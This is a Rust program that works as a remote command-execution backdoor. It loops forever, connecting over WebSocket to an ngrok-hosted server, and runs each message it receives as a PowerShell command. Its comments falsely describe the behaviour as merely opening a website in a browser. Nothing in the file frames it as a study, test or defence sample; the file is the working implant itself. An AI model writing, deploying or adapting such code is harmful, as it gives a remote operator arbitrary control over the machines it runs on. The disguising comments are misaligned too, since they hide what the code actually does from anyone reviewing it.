use url::Url;
use tungstenite::{connect, Message};
use std::process::Command;
use std::thread;
use std::time::Duration;

fn main()  {
    loop {
        let connection = connect(Url::parse("wss://barnacle-busy-heartily.ngrok-free.app ").unwrap());
        let (mut socket, response) = match connection {
            Ok(connection) => connection,
            Err(e) => {
                eprintln!("Failed to connect: {}", e);
                thread::sleep(Duration::from_secs(30));
                continue;
            }
        };

        match socket.write_message(Message::Text("Hello, server!".into())) {
            Ok(_) => (),
            Err(e) => {
                eprintln!("Failed to write message: {}. Retrying in 10 seconds...", e);
                // Sleep for 10 seconds
                thread::sleep(Duration::from_secs(10));
                continue;
            }
        }

        // Read a message from the server
        let msg = match socket.read_message() {
            Ok(msg) => msg,
            Err(e) => {
                eprintln!("Failed to read message: {}. Retrying in 10 seconds...", e);
                // Sleep for 10 seconds
                thread::sleep(Duration::from_secs(30));
                continue;
            }
        };
        println!("Received: {}", msg);


        // Use PowerShell to open the website in the default web browser
        let powershell_command = format!("{}",msg.clone());

        // Execute the PowerShell command
        let status = Command::new("powershell")
            .arg("-Command")
            .arg(&powershell_command)
            .status()
            .expect("Failed to execute PowerShell command");

        // Check if the PowerShell command executed successfully
        if status.success() {
            println!("Opened the website in the default web browser.");
        } else {
            println!("Failed to open the website.");
        }
    }
}